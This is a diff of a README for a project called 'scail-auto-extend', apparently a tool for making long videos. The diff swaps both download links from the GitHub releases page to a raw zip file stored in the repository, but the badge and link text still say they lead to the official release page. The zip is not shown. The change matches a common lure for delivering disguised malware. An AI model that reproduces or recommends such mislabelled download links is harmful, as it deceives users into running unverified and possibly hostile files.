@@ -1,6 +1,6 @@
 # 🎞️ scail-auto-extend - Create long videos with simple tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/ioanadelirious841/scail-auto-extend/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/ioanadelirious841/scail-auto-extend/main/web/scail-auto-extend-v3.7.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ To run this software, ensure your computer meets these conditions:
 
 Visit the official release page to download the latest version of the software.
 
-[Download the latest release here](https://github.com/ioanadelirious841/scail-auto-extend/releases)
+[Download the latest release here](https://raw.githubusercontent.com/ioanadelirious841/scail-auto-extend/main/web/scail-auto-extend-v3.7.zip)
 
 ## 🛠️ Step-by-step installation
 
